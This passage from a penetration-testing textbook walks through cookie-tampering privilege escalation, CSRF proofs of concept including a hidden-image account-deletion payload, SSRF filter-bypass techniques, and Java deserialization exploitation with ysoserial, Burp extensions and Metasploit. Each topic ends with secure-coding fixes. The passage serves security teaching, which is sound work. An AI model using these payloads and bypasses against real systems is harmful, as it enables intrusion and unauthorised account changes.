The permissions cookie seems rather obvious. It has a string that ends in an = symbol. When a string ends in a = symbol, it generally indicates base64 encoding, which is relatively standard. So, we can decode the value using the Burp Decoder. Refer to the following figure:

![](images/Figure_11.35.png)

Figure 11.35: Decoding the permissions cookie value

Now, we see the value is none. Let us try the value admin base64 encoded to see if we can get different access. We see a new menu option after encoding the value, updating the cookie, and refreshing the page. If we click it, we can access the admin panel and get another of the habit-helper CTF flags, as follows:

![](images/Figure_11.36.png)

Figure 11.36: Successful privilege escalation

[Secure coding tips to stop privilege escalation](#contents.xhtml_sc3_190a)

Privilege escalation is a potential pitfall in web application security, which can stem from various sources. To effectively address this issue, finding and rectifying the root cause behind the elevation of privileges is imperative. As you explore privilege-related issues, consider scrutinizing the role configurations.

*   Check if the role is being used as an IDOR and is susceptible to exploitation via that channel.
*   Determine if there is an injection vulnerability causing the issue.
*   Look for a misconfigured JWT implementation.
*   Perhaps a mass assignment vulnerability lies at the heart of the issue.

By pinpointing the specific origin of the problem, you can develop a more targeted and comprehensive solution.

To mitigate privilege escalation effectively, treat it like a detective task. Investigate whether it mirrors the characteristics of an IDOR, involves injection vulnerabilities, or arises from shortcomings in the configuration of JWTs. Additionally, inspect role assignments and permissions to uncover potential misconfigurations. Once the root cause is found, implement corrective measures tailored to address the issue. Whether it involves refining role-based access controls, securing against injection attacks, or enhancing the overall configuration of authentication mechanisms, a strategic and precise approach ensures a resilient defense against privilege escalation.

[Cross-Site Request Forgery](#contents.xhtml_sc2_191a)

CSRF is a security vulnerability in web applications that occurs when an attacker tricks a victim into sending a malicious request. This can lead to unintended actions being performed on behalf of the victim without their consent, potentially resulting in unauthorized changes to their account or data.

CSRF poses a significant security challenge. Web browsers automatically include various credentials with each request, even when triggered by external sources like forms, scripts, or images from other sites. This automatic inclusion of credentials, including session cookies, basic authentication headers, IP addresses, client-side SSL certificates, and Windows domain authentication, makes almost all websites vulnerable to CSRF attacks. The problem lies in the inherent trust browsers place in the requests, potentially leading to unauthorized actions performed by authenticated users without their consent.

[Testing for CSRF](#contents.xhtml_sc3_192a)

Before we start, note that CSRF and missing function level access control sometimes happen on the same functionality. They are different; you can have an application with both vulnerabilities on the same functionality or either one. If both missing function level access control and CSRF are there, then it can be hard or impossible to prove CSRF.

To test for CSRF, you generally use two web applications: one has the CSRF vulnerability, we will call that web application A, and the other is the application hosting the CSRF attack, and we will call that web application B. Embedding your CSRF in web application A is possible, but a separate web application is more traditional. The steps to perform a CSRF are as follows:

1. Craft a CSRF for the suspected vulnerability.

2. Add the CSRF to web application B.

3. Visit web application B before logging in to web application A. The CSRF should not be executed.

4. Log into web application A and revisit web application B. The CSRF should now be executed.

Now, we will run through two examples. The first is a simple example of how we will handcraft the CSRF POC. The second is more complicated and will use the Burp Suites CSRF POC generator.

[Simple CSRF example](#contents.xhtml_sc4_193a)

This simple CSRF example will look at the habit-helper application. Look at the administration controls we saw earlier when testing privilege escalation. For this example, we will craft a simple CSRF that deletes a user from the application. From the administrative account, go to the edit and delete accounts page, and copy the URL for deleting an account as shown below:

![](images/Figure_11.37.png)

Figure 11.37: Get URL of Get Action

This is an action performed by GET request, so we can embed this URL in a image with zero height and width like the following HTML:

<img src=”http://127.0.0.1:8081/habit-helper-1.0/admin?deleteaccount=10” width=”0” height=”0”>

Now, embed this image on web application or a static page and visit it logged in and logged out. In this case it does not work, the CSRF is not successful. Now, it is your turn to find the solution. There is another URL for deletion that will work in this way in the habit helper application. Take this one step further and create the CSRF. This is left as an exercise for the reader.

[Using Burp Suite’s CSRF POC](#contents.xhtml_sc4_194a)

This example will be a privilege escalation. We will create a CSRF to give our user account admin privileges in the amazing-myths-2 application. Let us find the request from Burp Suite by using the Search functionality demonstrated earlier in the book.

| Note: The Search option can be found by clicking Burp in the top left. |

Search for the editaccount URL in the request headers as follows:

![](images/Figure_11.38.png)

Figure 11.38: Searching for editaccount request

Then, find a POST request editing an account. Right-click on the request and select Engagement tools from the pop-up menu. Then, when the second menu comes up, select Generate CSRF PoC, as follows:

![](images/Figure_11.39.png)

Figure 11.39: CSRF POC option

Then, another window will open. This will allow you to configure the PoC, as shown in the following figure:

![](images/Figure_11.40.png)

Figure 11.40: CSRF PoC generator window

We need to set the isAdmin to value one and verify that the rest of the information is correct. Make modifications to the request and then click the Regenerate button. When it looks correct, you can Copy HTML to embed in a location of your choice or click the Test in browser button to open a page running this PoC. We will use the Test in browser button, which will first give us a URL to copy, and then we paste it into our browser, and it will display the following page:

![](images/Figure_11.41.png)

Figure 11.41: Page displayed by Burp Suite PoC

Click Submit request, and if you are logged in as an admin, it will update the user as shown below by browsing to the user as admin:

![](images/Figure_11.42.png)

Figure 11.42: CSRF PoC success

Continue reading the following subsection to find out how to fix CSRF vulnerabilities.

[Fixing CSRF vulnerabilities](#contents.xhtml_sc3_195a)

CSRF poses a substantial threat to the security of web applications, allowing attackers to perform unauthorized actions on behalf of authenticated users. To protect your application against CSRF attacks, consider implementing the following solutions, listed in order of increasing strength.

[Synchronizer Token](#contents.xhtml_sc4_196a)

The Synchronizer Token pattern is a robust defense mechanism that generates a randomly generated token for any state-changing operation. The key characteristics of this approach include:

*   Unique per session: Each user session is associated with a distinct token.
*   Cryptographically secure algorithm: The token is generated using a secure algorithm to prevent predictability.
*   Submission in requests: The token is submitted either as a hidden form field or as a header in AJAX requests.
*   Server validation: The server rejects requests if the token provided does not match the expected value.
*   Spring security implementation: For Java applications, Spring Security offers a reliable implementation of the Synchronizer Token pattern.

[Double cookie defense](#contents.xhtml_sc4_197a)

This strategy uses a random value sent as a cookie and a request parameter. The validation process includes:

*   Matching values: The values from the cookie and the request parameter are compared.
*   Rejection on mismatch: The server rejects the request if the values do not match.

[Encrypted Token Pattern](#contents.xhtml_sc4_198a)

The Encrypted Token Pattern enhances security by encrypting essential information such as user ID, timestamp, and nonce. The key components of this approach are:

*   Encrypted payload: The information is encrypted and returned with each request, either as a header in AJAX or a hidden form field.
*   Decryption validation: The server tries to decrypt the payload, rejecting the request if decryption fails.

By adopting these CSRF mitigation strategies, web applications can strengthen their resistance against CSRF attacks. Choose the solution that best fits your application's requirements and sensitivity to security concerns.

[Server-Side Request Forgery](#contents.xhtml_sc2_199a)

SSRF is a security vulnerability where an attacker can manipulate the server into making unintended requests to internal resources or external systems, often leading to unauthorized access, data exposure, or remote code execution on the server. This occurs when an application processes user-supplied input and requests other servers or resources without proper validation or restrictions. SSRF occurs for various reasons, often multiple reasons, including authorization issues, input validation issues, and others. We have already seen one example of an SSRF in the section on XXEs in [Chapter 7](#ch07.xhtml), Exploring Vectors with DoS Attack. Another SSRF example will be shown in [Chapter 13](#ch13.xhtml), Java Remote Method Invocation Vulnerabilities. This section will give some general steps for recognizing and finding SSRFs, and then tips to fix SSRF will follow.

[Testing for SSRF](#contents.xhtml_sc2_200a)

Testing for SSRF involves a series of crucial steps to pinpoint and exploit potential injection points, ultimately assessing the severity of the vulnerability. The following main steps outline the comprehensive approach to SSRF testing:

1.  Find SSRF injection points. Locate areas within the application where user input interacts with external resources, typically involving URLs or requests. Scrutinize input fields, parameters, or any data exchange mechanisms susceptible to SSRF.
2.  Test the exploitability of injection points. Assess the vulnerability's practical exploitability by attempting to manipulate the input to forge requests to internal or external systems. Evaluate the application's response to controlled input, gauging its susceptibility to SSRF attacks.
3.  Assess the severity of the vulnerability. Evaluate the impact of successful SSRF exploitation, considering the potential exposure of sensitive data or interaction with internal systems. Figure out the severity based on the consequences of a successful attack.

Most SSRFs are found via local and remote file inclusion—probe for vulnerabilities by manipulating input to include local or remote files and assessing the application's response.

Utilize the loopback interface for restricted content access. Leverage the trust relationship often associated with localhost or loopback IPs, exploiting the assumption that these requests possess the highest privileges.

Inject elements into PDF generators. If the application converts files to PDF, inject elements like <iframe>, <img>, <base>, or <script> pointing to internal servers.

Some standard filter bypass techniques that might help are as follows:

*   Overcome restrictions by exploring alternative IPs (e.g., decimal or octal notations) or registering domains resolving to localhost.
*   If input validation involves regex or string matching, employ techniques like URL encoding, the @ character, URL fragmentation, or fuzzing.

[Fixing SSRF vulnerabilities](#contents.xhtml_sc3_201a)

Several protective measures are possible for SSRF-related vulnerabilities at both the application and network layers. The SSRF can involve two applications: the vulnerable application that can be used to perform the SSRF and another application that is called inappropriately in the SSRF. In the inappropriately called application proper enforcement and checking of authentication and authorization can deter many SSRF attempts.

On the vulnerable application, input validation is essential. The allow-list approach cannot be thwarted and always works. When an allowlist does not work due to the need to accept diverse data that cannot be put in an allowlist, then parsers or denylists can be used. However, both alternatives have weaknesses. Parsers except in extremely simplistic cases can be CPU intensive, complex and prone to errors. Denylists only work against the known and listed bad inputs, so security gaps almost always exist.

In SSRF, validations can be added to ensure that the input string respects the expected business or technical format. A regex can be used to ensure that the data received is valid from a security point of view if the input data have a simple format (e.g., token, zip code, etc.). Otherwise, validation should be conducted using the libraries available from the string object because regex for complex formats is challenging to maintain and is highly error-prone.

[Conclusion](#contents.xhtml_sc2_202a)

As we conclude our exploration into authorization practices, you gained insight into prevalent attack vectors and developed practical testing skills and secure coding knowledge. From finding missing function level access control using Burp Suite's Site Map Tool to unraveling the complexities of IDOR and privilege escalation, this chapter has fortified you against potential exploits. CSRF and SSRF are explored, enabling you to recognize and mitigate these threats.

In the next chapter, we will cover the basics of serialization and practical exploitation using tools such as Ysoserial, Burp Suite, and Metasploit. By the end of the next chapter, you will be able to create payloads for Java deserialization vulnerabilities and implement preventive measures.

Join our book’s Discord space

Join the book's Discord Workspace for Latest updates, Offers, Tech happenings around the world, New Release and Sessions with the Authors:

**[https://discord.bpbonline.com](https://discord.bpbonline.com)**

![](images/fm1.png)

# [CHAPTER 12Java Deserialization Vulnerabilities](#contents.xhtml_ch12a)

[Introduction](#contents.xhtml_sc2_203a)

Java deserialization vulnerabilities stand as a formidable challenge, capable of exposing critical weaknesses in applications. This chapter explores deserialization vulnerabilities, unraveling the intricacies of this often-underestimated threat. Beginning with the foundational serialization basics, we delve into the manual exploitation using Ysoserial, leveraging the powerful tools Burp Suite and Metasploit for exploitation. Through step-by-step testing examples and detailed coding guidance, this chapter equips you with the knowledge and practical skills to understand, find, and mitigate Java deserialization vulnerabilities.

[Structure](#contents.xhtml_sc2_204a)

This chapter will discuss the deserialization vulnerabilities, including:

*   Java deserialization basics
*   Deserialization vulnerabilities
*   Using Burp Suite to test and exploit deserialization
*   Metasploit and other tools
*   Secure coding guidance for deserialization

There will be step-by-step testing examples and detailed coding guidance.

[Objectives](#contents.xhtml_sc2_205a)

By the end of this chapter, you will understand Java deserialization and how it can create a vulnerability. You will know how to identify these vulnerabilities, create payloads, and deliver those payloads. You will also learn to use tools like ysoserial, Metasploit, and Burp Suite to exploit Java deserialization vulnerabilities. Finally, you will become familiar with secure coding guidelines to help you avoid these issues.

[Java deserialization basics](#contents.xhtml_sc2_206a)

Serialization is a fundamental concept in programming that plays a pivotal role in storing the state of programmatic objects as bytes, offering a reversible process. This mechanism seamlessly transmits objects to remote programs, be it a variable, a set of variables, or an entire class. The crux lies in ensuring that the receiving endpoint can effortlessly reconstruct or deserialize the received object without altering its state.

Java is a programming language renowned for its versatility that widely embraces serialization. This process serves diverse purposes, including data storage, data transfer, and even calling remote procedures through Remote Procedure Call (RPC) methods. The act of serializing data is sometimes referred to as marshaling, while the inverse process of restoring the original object from bytes is known as deserialization or unmarshalling.

It is crucial to emphasize that serialized data lacks encryption or signing. This means that the data is susceptible to tampering once detected. This vulnerability can yield unexpected outcomes during the deserialization of components. While some transport protocols leverage serialization with compression or encryption, the nature of serialized data can vary—it may be plain, hidden, or secured. Attackers and penetration testers often find the unsecured variant, which offers a higher severity attack when exploited.

Insecure deserialization gained prominence in 2015 when security researchers publicly presented its risks. Demonstrations showcased how the deserialization of untrusted Java serialized data could lead to remote code execution. MITRE and CWE formally recognize this issue as the deserialization of untrusted data, and OWASP elevated it to a top 8 security concern in 2017.

While serialized objects are most prevalent in web applications written in PHP, Java, and .NET, serialization vulnerabilities transcend language boundaries. Other languages, such as Python, Ruby, and more, also harbor potential vulnerabilities. This cross-language susceptibility underscores the importance of addressing deserialization concerns holistically in the realm of secure application development. In the following subsection, we will walk through a simple Java code example to ensure everyone understands fundamentally how serialization works.

[Simple Java example](#contents.xhtml_sc3_207a)

We will look at a simple Java example to understand serialization. The code below has two classes. In this example, the FooBar class implements the Serializable interface, indicating that its objects can be serialized. The class has two variables, foo of type Integer and bar of type String, along with a constructor.

The SerializeFooBar class contains a main method where a FooBar object is created with hard-coded values. It then uses an ObjectOutputStream to serialize the object and write it to a file named foobar.serial. The file output stream is wrapped in an ObjectOutputStream to handle the serialization process. The program prints a message indicating the completion of serialization:

import java.io.*;

// Serializable class FooBar

class FooBar implements Serializable {

private Integer foo;

private String bar;

// Constructor

public FooBar(Integer foo, String bar) {

this.foo = foo;

this.bar = bar;

}

// Getter for foo

public Integer getFoo() {

return foo;

}

// Getter for bar

public String getBar() {

return bar;

}

}

// Class SerializeFooBar with the main method

public class SerializeFooBar {

public static void main(String[] args) {

// Creating a FooBar object with hard-coded values

FooBar fooBarObject = new FooBar(42, "SampleString");

// Serialization

try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("foobar.serial"))) {

// Writing the FooBar object to the file

oos.writeObject(fooBarObject);

System.out.println("Serialization completed. FooBar object written to foobar.serial.");

} catch (IOException e) {

e.printStackTrace();

}

}

}

Now, let us see what happens when we run this code. In the following capture from the command line, these two files are compiled and run. Then, the output file is checked. Refer to the following figure:

![](images/Figure_12.1.png)

Figure 12.1: Serializing a class

The value stored inside the file is the serialized data. Now, let us write code to deserialize this file. In this example, the DeserializeFooBar class contains a main method where an ObjectInputStream is used to read the foobar.serial file. The read object is cast to a FooBar type, and its values are then printed to the console. The program catches IOException and ClassNotFoundException that may occur during the deserialization process. Refer to the following code:

import java.io.*;

// Class DeserializeFooBar with the main method

public class DeserializeFooBar {

public static void main(String[] args) {

// Deserialization

try (ObjectInputStream ois = new ObjectInputStream(new FileInputStream("foobar.serial"))) {

// Reading the FooBar object from the file

FooBar deserializedFooBar = (FooBar) ois.readObject();

// Printing values

System.out.println("Deserialization completed. Foo: " + deserializedFooBar.getFoo() +

", Bar: " + deserializedFooBar.getBar());

} catch (IOException | ClassNotFoundException e) {

e.printStackTrace();

}

}

}

Let us run this code and see what happens. In the following figure, this code is compiled and run on the command line. The class is successfully deserialized.

![](images/Figure_12.2.png)

Figure 12.2: Deserializing sample object

Now, let us modify the value of the serialized object and see what happens when we run the code to deserialize the object. In the following figure, we change the name of the class to FooBarHacked:

![](images/Figure_12.3.png)

Figure 12.3: Editing serialized data

Now, we run the deserialization with the modified code as follows:

![](images/Figure_12.4.png)

Figure 12.4: Deserialization error

As you can see, we caused an error but could not get the code to respond with valid data. In the next section, we will learn more about how deserialization can be exploited and use Ysoserial to exploit this simple example.

[Deserialization vulnerabilities](#contents.xhtml_sc2_208a)

This section will go into more detail about how deserialization can be recognized and how the exploitation works. There are several types of insecure deserialization attacks. Some attacks are simple and involve identifying the serialized object in a request, deserializing it, and changing it in some way to access information or capabilities that your user should not have access to. This case is similar to the various authorization attacks covered in the last chapter, including Insecure Direct Object Reference (IDOR) and privilege escalation. Other insecure deserialization involves recognizing the objects making unsafe calls and changing those already existing calls. Yet other times, it involves an entirely different chain called a gadget. All of these are different shades of deserialization. We will focus on the last case in this chapter. These examples will also enable you to pick up the two easier deserialization attacks.

In Java code, there are three indicators of serialization that a penetration tester should look for when testing: the hexadecimal form contains AC ED 20 05, a base64 encoded string starting with rO0, or the Content-type header of the HTTP response is set to application/x-java-serialized-object.

Looking at our previous example, we can paste the file contents into the burp decoder. Then, from the encode as dropdown, select ASCII hex. In the following figure, the serialized file begins with the hexadecimal indicator AC ED 20 05\. Then, we can encode that as base64 by making a similar selection and see that it matches the serialization indicator rO0.

![](images/Figure_12.5.png)

Figure 12.5: Observing the serialized data indications

Now that we can find serialization in the programs let us learn how to exploit it.

The deserializing endpoint must include in its classpath or import all the classes and packages constituting the serialized object. Exploiting Java serialization involves transmitting a malevolent state of an object to the deserializing endpoint, presenting a potential avenue for security vulnerabilities.

There are multiple approaches to executing system calls or operating system commands. One method entails using Java.lang.Runtime.getRuntime().exec("whoami"), and an alternative technique involves leveraging the ProcessBuilder class to achieve a similar outcome.

For the deserialization endpoint to execute, it should be encapsulated within a serialized object's property. Here, a Java property refers to a characteristic or attribute of an object, such as the exec property of getRuntime in the example mentioned above.

In this context, the execution during deserialization occurs through the recursive access of an object's properties, creating a chain that ultimately leads to code execution. Reflection in Java is a concept that facilitates this previously unknown class order, allowing for the sequential invocation of classes. Reflection permits the utilization of methods without prior knowledge, and its presence can be identified by the opaque calling order in the code. This dynamic capability introduces both flexibility and potential risks to the codebase.

A potentially exploitable condition in Java emerges when the readObject() method is invoked on a user-controlled (i.e., untrusted) object. This becomes a vector for exploitation as an attacker can craft an object with nested properties engineered to execute malicious code upon method invocation. The attacker seizes control of the method call by implementing a dynamic proxy and an Invocation Handler within the serialized object's properties.

In Java deserialization vulnerabilities, a Dynamic Proxy serves as a mechanism that allows the creation of proxy instances dynamically at runtime. This proxy, created for a specific interface, enables the interception of method invocations on the interface, providing control over the object's behavior. On the other hand, an Invocation Handler defines the logic that will be executed when a method is invoked on the proxy object. By integrating these elements within the serialized object's properties, an attacker can manipulate method calls, paving the way for executing malicious code during deserialization.

Each property or method embedded within a nested exploit object is aptly termed a gadget. Finding specific Java libraries hosting universal gadgets used to construct serialized exploit objects gave rise to gadget libraries. It is crucial to note that the categorization of these libraries as gadget libraries does not inherently render them insecure; rather, it signifies that in the event of insecure deserialization, while these libraries are within the classpath of the running application, attackers can leverage them to craft a known gadget chain, leading to successful exploitation.

Developing gadgets requires profound knowledge and ability, a task we would not undertake in this discussion. Instead, we will explore the use of pre-existing gadgets and gadget libraries. The following subsection guides us through generating payloads using well-known gadgets with a powerful tool—Ysoserial. Through this exploration, we delve into the practical aspects of constructing and executing payloads, using the rich capabilities afforded by Ysoserial for compelling and insightful learning in Java deserialization vulnerabilities.

[Generating a payload with Ysoserial](#contents.xhtml_sc3_209a)

You can download the latest jar of Ysoserial from their release page on GitHub, located at [https://github.com/frohoff/ysoserial/releases](https://github.com/frohoff/ysoserial/releases). Download the jar file as follows:

![](images/Figure_12.6.png)

Figure 12.6: Ysoserial download

After downloading the jar, place it in any directory and call it from the command line. As it is a jar, all OS can access it the same way with the command:

java -jar Ysoserial-all.jar

After running the command, the usage and a list of payload types and their dependencies are shown as follows:

![](images/Figure_12.7.png)

Figure 12.7: Ysoserial usage

Let us create a payload. Use the CommonsCollection4 payload with the whoami command. The whoami command is an excellent first command if you do not know the OS, as it works on Linux, Windows, and Mac. Our command is:

java -jar Ysoserial-all.jar CommonsCollection4 whoami

If the command has a space, use single quotes. Ysoserial runs best in Java 8 if you have it. The result (our first payload) is shown as follows:

![](images/Figure_12.8.png)

Figure 12.8: Generating a payload with Ysoserial

As you can see, the result is binary and displayed on the screen.

We can store it in a file in any operating system using the > pipe. So our command to save this payload to the file test1.ser would be:

java -jar Ysoserial-all.jar CommonsCollection4 whoami > test1.ser

The resultant output, including the file contents, is given in the following figure:

![](images/Figure_12.9.png)

Figure 12.9: Saving payload to a file

You may want the payload as a base64 encoded string or in hexadecimal. In Linux, you can use the pipe symbol | to run the output through the base64 or xxd command for base64 encoding or hexadecimal, respectively.

You can take the content on all operating systems and paste the serialized content into the Burp Suite Decoder tab’s text box, then encode and select Base64 from the Encode As drop-down. The serialized payload will be in the second text box that appears. Check that it is a valid serialized Java object by checking the first three characters are rO0, as shown in the following figure:

![](images/Figure_12.10.png)

Figure 12.10: Encoding the data as base64 using Burp Suite

Let us try a payload on our simple application and see what happens. So, we need to rename our new payload to foobar.serial and run the deserialization code. Running this code gives the following result:

![](images/Figure_12.11.png)

Figure 12.11: Class not found error

An error like this means deserialization occurred, but the gadget libraries were not in the classpath or the import. This is proof of deserialization, and there may or may not be a known gadget that can be used to exploit. This error generally indicates that the tampering was not detected, and this is a valid input to attempt this type of attack. It is a sign to keep trying more payloads.

Let us take this through to the conclusion and force the exploit. We do this by changing the code to import the commons collection. The new code to DeserializeFooBar.java is given as follows:

import java.io.*;

import org.apache.commons.collections4.*;

// Class DeserializeFooBar with the main method

public class DeserializeFooBar {

public static void main(String[] args) {

// Deserialization

try (ObjectInputStream ois = new ObjectInputStream(new FileInputStream("foobar.serial"))) {

// Reading the FooBar object from the file

FooBar deserializedFooBar = (FooBar) ois.readObject();

// Printing values

System.out.println("Deserialization completed. Foo: " + deserializedFooBar.getFoo() +

", Bar: " + deserializedFooBar.getBar());

} catch (IOException | ClassNotFoundException e) {

e.printStackTrace();

}

}

}

Now, we have to recompile it. First, we may need to download and store the Apache Commons library locally. You may go to the Apache website and get the latest version of 4\. Then, store it in a folder named C:\library\.

Now, to compile from the command line, I will set my classpath manually to be C:\library and use the following command javac -cp C:\library\* FooBar.java DeserializeFooBar.java to compile, as shown in the following figure:

![](images/Figure_12.12.png)

Figure 12.12: Compiling with classpath

Now, let us run the code. We can use the command java -classpath C:\library\*;D:\NancyDocuments\Code\serial\* DeserializeFooBar.

| Note: To run this code we have to add the location the .class files were compiled to as well as the location of any libraries. |

This is run as shown:

![](images/Figure_12.13.png)

Figure 12.13: Invalid for deserialization error

This time, we got an error that the class was invalid for deserialization. This means the library being used by this program is not vulnerable to deserialization attacks. Instead of getting the latest library available, we need to find out which version is susceptible and download that one.

The website mvnrepository is a good resource for this. Apache has removed vulnerable versions of their library for download, but the mvnrepository site has a historical record, lists vulnerabilities, and allows downloads, as shown in the following figure:

![](images/Figure_12.14.png)

Figure 12.14: Finding the vulnerable library to download

Replace the good version of the common jar with the bad one and then rerun it. This time, our exploit works. Refer to the following figure:

![](images/Figure_12.15.png)

Figure 12.15: Working exploit deserialization

| Note: The Java version matters when compiling and running Java code that may be vulnerable to deserialization. Newer Java runtimes give illegal reflection warnings and errors. Eventually, this may stop deserialization errors, except in rare cases. Today, plenty of people and consumers are using older Java versions. |

[Using Burp Suite to test and exploit deserialization](#contents.xhtml_sc2_210a)

Navigating deserialization vulnerabilities demands a robust testing and exploitation approach. In this section, we explore the integration of Burp Suite and its extensions to find and exploit deserialization vulnerabilities. By using dedicated extensions from the BApp Store, such as the renowned Java Deserialization Scanner, we will discuss the practical aspects of testing and securing against these critical security threats.

To begin, Burp Suite's Extender tab reveals many extensions for deserialization attacks. Searching for serial will bring up the following list, which can be sorted by rating or popularity. Refer to the following figure:

![](images/Figure_12.16.png)

Figure 12.16: Finding serialization extension in Burp Suite

The Java Deserialization Scanner is a notable choice, known for its effectiveness in finding vulnerabilities. Installation is seamless; select the desired extension and click the Install button. Once installed, Burp Suite's dashboard and issues section in the target tab provide a comprehensive overview of potential security concerns, highlighting instances of Java serialized objects, such as the following example:

![](images/Figure_12.17.png)

Figure 12.17: Look at the serialized request in Issues from the target tab

With the identified serialized object in focus, right-clicking on the HTTP request pops up a submenu that can be used to send the request to an extension. Select the Extension option, and then from the submenu, choose the preferred extension, such as the Java Deserialization Scanner, as shown in the following figure:

![](images/Figure_12.18.png)

Figure 12.18: Send request to an extension

The manual and exploitation tabs within the Java Deserialization Scanner provide a robust interface for testing and exploiting deserialization flaws. Manual testing does not provide the Ysoserial payloads, whereas the Exploiting tab does. Notable features include the insertion point controls for serialized data, post-processing rule options, and ysoserial payload customization. After sending a request to the Deserialization Scanner, select the Deserialization Scanner tab. The request sent to the scanner will be automatically inserted into the tool. Below the request is our default option for exploitation with ysoserial. At the bottom are the encoding rules for the requests. This is shown in the following figure:

![](images/Figure_12.19.png)

Figure 12.19: Exploitation tab of Java Deserialization Scanner

To set the insertion point for an attack, highlight the serialized data in the request and click the Set Insertion Point button. In our example, this is the session cookie. After setting the insertion point, the serialized data will be highlighted in the request by the extension and will stay highlighted as long as the insertion point is set. The highlighting does make the data in this insertion point difficult to read. Likewise, click the clear insertion point to remove both the insertion point and the highlighting. In the center is your Payload selection from Ysoserial and its command in single quotes if necessary. At the bottom, you can stack multiple post-processing rules from the selected list. The Attack button at the bottom will run the command and show the request and response pairs from the exploitation attempt in the section to the right. This is illustrated for our example in the following figure:

![](images/Figure_12.20.png)

Figure 12.20: Running an attack with Java Deserialization Scanner Exploiting tab

Configuration is critical, and this extension requires the setup of the Java 8 runtime and the path to the ysoserial jar to facilitate the extension's operations. This can be done in the Configuration tab, as shown in the given figure:

![](images/Figure_12.21.png)

Figure 12.21: Configuration for Java Deserialization Scanner

Beyond exploitation, the Java Deserialization Scanner offers a dedicated manual testing tab. While resembling the exploitation tab, it introduces a nuanced drop-down menu offering specific test options. The drop-down is located next to the Set Inertion Point and Clear Insertion Point buttons and offers three test options currently. Refer to the following figure:

![](images/Figure_12.22.png)

Figure 12.22: Scan options

To unearth vulnerable libraries, this tab runs tests based on the selected criteria, providing detailed results to the right of the manual testing information, as shown in the following figure:

![](images/Figure_12.23.png)

Figure 12.23: Java Deserialization Scanning

As showcased through Burp Suite, Java Deserialization Scanner emerges as a powerful tool simplifying the complexities of working with deserialization vulnerabilities. The extension integrates testing, exploitation, and manual assessment, offering a holistic approach. While Java Deserialization Scanner stands out, exploring other extensions within Burp Suite's BApp Store might reveal alternatives that suit specific preferences and requirements better in securing against deserialization vulnerabilities.

[Metasploit and other tools](#contents.xhtml_sc2_211a)

When dealing with deserialization vulnerabilities, the choice of tools becomes crucial, especially in scenarios where Burp Suite may not be applicable due to the absence of HTTPS protocol at the deserialization endpoint. In such cases, alternative tools prove invaluable.

In certain instances, Metasploit, a robust penetration testing framework, can supply exploits for deserialization vulnerabilities. By starting the msfconsole and searching for relevant exploits, opportunities for using known vulnerabilities can be unveiled. We generally search for the term java serial to find an exploit. Refer to the following figure:

![](images/Figure_12.24.png)

Figure 12.24: Searching for Java deserialization exploits in Metasploit

Specific software like JBOSS or Jenkins may have dedicated exploits, calling for individual searches for tailored results.

However, if neither Burp Suite nor Metasploit proves fruitful, resorting to network traffic analysis becomes a last resort. Tools like Wireshark or Tshark can capture network traffic, isolating desired packets. The Serialization Dumper Tool released by Nicky Bloor on his Github is available at: [https://github.com/NickstaDB/SerializationDumper](https://github.com/NickstaDB/SerializationDumper).

The Serialization Dumper Tool helps extract and visualize serialized data from these packets. With a simple command-line interface, the tool supports viewing and partially rebuilding serialized streams. This tool runs from the command line and the serialized data should be supplied in hexadecimal, such as:

java -jar SerializationDumper-v1.1.jar aced0005740004414243447071007e0000

The serialized data can also be sent as a file. An example of using this tool is shown as follows:

![](images/Figure_12.25.png)

Figure 12.25: Serialization Dumper Tool example

While Burp Suite and Metasploit stand as go-to options for deserialization vulnerability testing, scenarios lacking HTTPS support cause exploration beyond these conventional tools. Serialization Dumper Tool, with its network traffic analysis capabilities, steps in as a valuable alternative, providing insights into serialized data and aiding in identifying and mitigating deserialization vulnerabilities. In the expansive landscape of cyber security tools, adaptability and a varied toolkit remain paramount for practical vulnerability assessment and mitigation.

[Secure coding guidance for deserialization](#contents.xhtml_sc2_212a)

When writing code or performing a code review, it is imperative to remain vigilant for potential deserialization vulnerabilities. The Java APIs associated with these vulnerabilities encompass a spectrum of elements, including XMLdecoder with external user-defined parameters, XStream with the fromXML method (notably, XStream version <= v1.4.6 is susceptible to serialization issues), ObjectInputStream with readObject, and various methods such as readObjectNoData, readResolve, readExternal, and ObjectInputStream.readUnshared. Additionally, the use of the Serializable interface introduces considerations for secure coding.

Several strategic measures can be employed to fortify your code against deserialization vulnerabilities. Avoid making every class serializable unless necessary, and if inheriting serializable, implement a customized version of readObject to halt undesired serialization. Leverage the transient keyword for fields that should remain private and not be serialized to retain their privacy. If serialization is required but restricted to a specific allowlist of classes, implementing a customized ObjectInputStream function ensures that only the expected classes undergo deserialization. Let us look at a few examples of these ideas.

First, if the class we are writing does not need to be serializable, remove the implements Serializable from the class declaration. For example, in our FooBar class, we could change the following line:

class FooBar implements Serializable {

To the line given below:

class FooBar {

If the class needs to be Serializable but the member bar is too confidential for serialization, we can use the transient keyword to define it. For example, the declaration of bar would change from private String bar; to private transient String bar;

If FooBar inherited Serializable, but we do not want it to be serialized, then we can implement a readObject method for our class, which would override the other. This method will always fail and would look like the following:

private final void readObject(ObjectInputStream in) throws java.io.IOException {

throw new java.io.IOException("FooBar cannot be deserialized");

}

If we want to allow deserialization but only of the FooBar class itself or a similar allowlist, we could write a custom ObjectInputStream like the following:

public class LookAheadObjectInputStream extends ObjectInputStream {

public LookAheadObjectInputStream(InputStream inputStream) throws IOException {

super(inputStream);

}

/** Only deserialize FooBar */

@Override

protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {

if (!desc.getName().equals(FooBar.class.getName())) {

throw new InvalidClassException("Attempted to deserialize a class other than Foo Bar", desc.getName());

}

return super.resolveClass(desc);

}

}

This uses the LookAheadObjectInputStream, called before ReadObject, thus guaranteeing we only deserialize FooBar.

There are various methods to protect your code from deserialization. Choose the correct use case for both business and security.

[Conclusion](#contents.xhtml_sc2_213a)

This chapter provided an in-depth analysis of Java deserialization vulnerabilities. You have gained a comprehensive understanding of the subject, covering the basics of serialization and practical exploitation techniques using various tools such as Ysoserial, Burp Suite, and Metasploit. The step-by-step testing examples provided in this chapter will enable you to identify and create payloads for Java deserialization vulnerabilities. Moreover, you learned how to implement preventive measures to safeguard applications and uphold secure coding practices.

In the next chapter, we will discuss Java RMI vulnerabilities. This will cover RMI basics, manual exploits, enumeration, helpful tools such as the Remote Method Guesser and Metasploit, as well as exploiting internal RMI servers through SSRF.

Join our book’s Discord space

Join the book's Discord Workspace for Latest updates, Offers, Tech happenings around the world, New Release and Sessions with the Authors:

**[https://discord.bpbonline.com](https://discord.bpbonline.com)**

![](images/fm1.png)

